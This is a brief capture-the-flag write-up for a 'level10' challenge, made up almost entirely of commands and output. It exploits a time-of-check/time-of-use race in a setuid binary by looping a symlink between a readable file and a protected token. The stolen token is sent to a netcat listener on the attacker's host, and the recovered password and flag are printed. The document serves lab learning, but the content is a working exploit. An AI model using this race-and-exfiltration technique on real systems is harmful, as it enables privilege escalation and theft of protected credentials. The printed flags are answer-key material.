# Level10

```bash
ls -la
# Output
-rwsr-sr-x+ 1 flag10  level10 10817 Mar  5  2016 level10
-rw-------  1 flag10  flag10     26 Mar  5  2016 token
```
echo hello > /tmp/test

# on host
ip_addr=`ifconfig en0 | egrep  "inet [0-9]+\." | awk -F' ' '{print $2}'`

ltrace ./level10 /tmp/test $ip_addr

# Solution

while :; do ln -sf /tmp/token /tmp/token10; ln -sf /home/user/level10/token /tmp/token10; done

 while :; do nice -n 20 /home/user/level10/level10 /tmp/token10 $ip_addr; done

on host do this
while true; do nc -l 6969 >> token; done

# OUtput
woupa2yuojeeaaed06riuj63c
.*( )*.
.*( )*.
woupa2yuojeeaaed06riuj63c
.*( )*.
woupa2yuojeeaaed06riuj63c

su flag10
# passowrd: woupa2yuojeeaaed06riuj63c
getflag
Check flag.Here is your token : feulo4b72j7edeahuete3no7c
